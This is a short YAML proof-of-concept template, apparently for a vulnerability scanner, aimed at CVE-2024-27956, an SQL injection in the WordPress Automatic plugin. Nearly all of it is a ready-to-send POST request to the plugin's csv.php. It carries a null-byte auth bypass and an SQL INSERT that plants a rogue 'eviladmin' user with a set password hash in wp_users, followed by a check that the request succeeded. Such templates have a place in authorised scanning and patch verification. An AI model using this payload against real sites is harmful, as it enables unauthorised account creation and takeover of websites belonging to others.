name: poc-yaml-CVE-2024-27956-WordPress-Automatic-SQLi
rules:
  - method: POST
    path: /wp-content/plugins/wp-automatic/inc/csv.php
    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate, br
      Content-type: application/x-www-form-urlencoded
      Connection: close
      Upgrade-Insecure-Requests: 1
    body: |
      auth=%00&integ=09956ea086b172d6cf8ac31de406c4c0&q=INSERT+INTO+wp_users+%28user_login%2C+user_pass%2C+user_nicename%2C+user_email%2C+user_url%2C+user_registered%2C+user_status%2C+display_name%29+VALUES+%28%27eviladmin%27%2C+%27%24P%24BASbMqW0nlZRux%2F2IhCw7AdvoNI4VT0%27%2C+%27eviladmin%27%2C+%27eviladmin%40gmail.com%27%2C+%27http%3A%2F%2F127.0.0.1%3A8000%27%2C+%272024-04-30+16%3A26%3A43%27%2C+0%2C+%27eviladmin%27%29
    expression: |
      response.status == 200 && response.body.bcontains(b"DATE")
detail:
  vulnpath: "/"
  author: 7aRanchi
  description: "WordPress Automatic Plugin SQLi CVE-2024-27956"
  links:
    - https://github.com/7aRanchi
